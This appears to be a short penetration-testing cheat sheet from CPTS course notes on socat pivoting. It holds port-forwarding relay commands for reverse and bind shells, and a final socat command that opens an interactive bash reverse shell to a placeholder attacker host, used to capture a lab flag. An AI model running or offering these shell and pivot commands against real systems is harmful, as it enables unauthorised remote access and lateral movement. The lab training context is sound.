# Socat

% socat, pivot, portfw, cpts

## Socat - Socat - Socat - Socat - Socat - start-listener
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

## Socat - Socat - Socat - Socat - Socat - starting-socat-bind-shell-listener
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

## Socat - Socat - Socat - Socat - Socat - starting-socat-listener
#cat/PIVOT/TUNNEL-PORTFW #cpts
Socat Redirection with a Reverse Shell

```
:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

## Socat - Socat - Socat - Socat - Socat - starting-socat-bind-shell-listener-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
Socat Redirection with a Bind Shell

```
:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

## Socat - Socat - Socat - Socat - Socat - submit-the-contents-of-the-flagtxt-file-in-the-homesrvadm-directory
#cat/PIVOT/TUNNEL-PORTFW #cpts
Then, using the previously established `nc` reverse shell, students need to run the following command:

```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:PWNIP:PWNPO
```

